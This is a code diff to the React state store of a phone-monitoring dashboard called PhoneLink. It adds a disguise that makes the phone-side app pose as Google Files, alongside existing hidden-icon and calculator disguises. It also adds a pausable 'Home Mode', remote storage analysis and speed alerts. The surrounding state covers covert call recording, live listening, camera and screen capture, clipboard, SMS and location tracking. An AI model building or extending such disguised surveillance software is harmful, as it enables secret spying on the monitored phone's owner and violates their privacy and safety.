@@ -78,6 +78,7 @@ export function StoreProvider({ children }) {
   const [callRecordingConfig, setCallRecordingConfig] = useState({});
   const [camouflageConfig, setCamouflageConfig] = useState({});
   const [quickSettingsStatus, setQuickSettingsStatus] = useState({});
+  const [storageAnalysisData, setStorageAnalysisData] = useState({});
   const [findPhoneAlerting, setFindPhoneAlerting] = useState({});
   const findPhoneTimers = useRef({});
   const ws = useRef(null);
@@ -858,15 +859,49 @@ function titleOrApp(appName, title, text) {
               if (old) {
                 if (p.hideAppIcon && !old.hideAppIcon) {
                   pushToast('👻 App icon completely hidden on phone home screen & drawer', 'info');
+                } else if (p.filesDisguise && !old.filesDisguise) {
+                  pushToast('📁 Google Files camouflage active on phone', 'info');
                 } else if (p.calculatorDisguise && !old.calculatorDisguise) {
                   pushToast('🧮 Calculator camouflage active on phone', 'info');
-                } else if ((old.hideAppIcon || old.calculatorDisguise) && (!p.hideAppIcon && !p.calculatorDisguise)) {
+                } else if ((old.hideAppIcon || old.calculatorDisguise || old.filesDisguise) && (!p.hideAppIcon && !p.calculatorDisguise && !p.filesDisguise)) {
                   pushToast('Standard PhoneLink icon active', 'info');
                 }
               }
               return { ...prev, [p.deviceId]: p };
             });
           }
+          break;
+        }
+
+        case 'MONITORING_PAUSED_STATUS': {
+          if (p.deviceId) {
+            setDevices((prev) => ({
+              ...prev,
+              [p.deviceId]: {
+                ...(prev[p.deviceId] || {}),
+                monitoringPaused: !!p.paused
+              }
+            }));
+            pushToast(
+              p.paused
+                ? '🏠 Home Mode Enabled: Call/SMS/Location sync is paused'
+                : '🛡️ Monitoring Resumed: Full tracking active',
+              p.paused ? 'warning' : 'success'
+            );
+          }
+          break;
+        }
+
+        case 'STORAGE_ANALYSIS_DATA': {
+          if (p.deviceId) {
+            setStorageAnalysisData((prev) => ({ ...prev, [p.deviceId]: p }));
+            pushToast('📊 Storage analysis received from phone', 'success');
+          }
+          break;
+        }
+
+        case 'SPEED_ALERT': {
+          pushToast(`🚨 Speed Alert: Phone moving at ${p.speedKmh} km/h (Threshold: ${p.thresholdKmh} km/h)`, 'warning');
           break;
         }
 
@@ -911,7 +946,8 @@ function titleOrApp(appName, title, text) {
             battery: d.battery,
             isCharging: !!d.charging,
             last_seen: d.last_seen,
-            online: d.online
+            online: d.online,
+            monitoringPaused: !!d.monitoringPaused
           };
         });
         setDevices((prev) => ({ ...mapped, ...prev }));
@@ -1313,6 +1349,16 @@ function titleOrApp(appName, title, text) {
         if (!activeDeviceId) return;
         sendCommand('call-recording-config', { enabled, deviceId: activeDeviceId });
       },
+      storageAnalysis: storageAnalysisData[activeDeviceId] || null,
+      requestStorageAnalysis: async () => {
+        if (!activeDeviceId) return;
+        pushToast('Requesting storage analysis from phone...', 'info');
+        await sendCommand('storage-analysis', { deviceId: activeDeviceId });
+      },
+      pauseMonitoring: async (paused) => {
+        if (!activeDeviceId) return;
+        await sendCommand('pause-monitoring', { deviceId: activeDeviceId, paused });
+      },
       camouflage: camouflageConfig[activeDeviceId] || null,
       updateCamouflage: (config) => {
         if (!activeDeviceId) return;
@@ -1365,7 +1411,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, timelapseGallery, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, camouflageConfig, quickSettingsStatus, findPhoneAlerting, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
+    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, timelapseGallery, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, camouflageConfig, quickSettingsStatus, storageAnalysisData, findPhoneAlerting, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
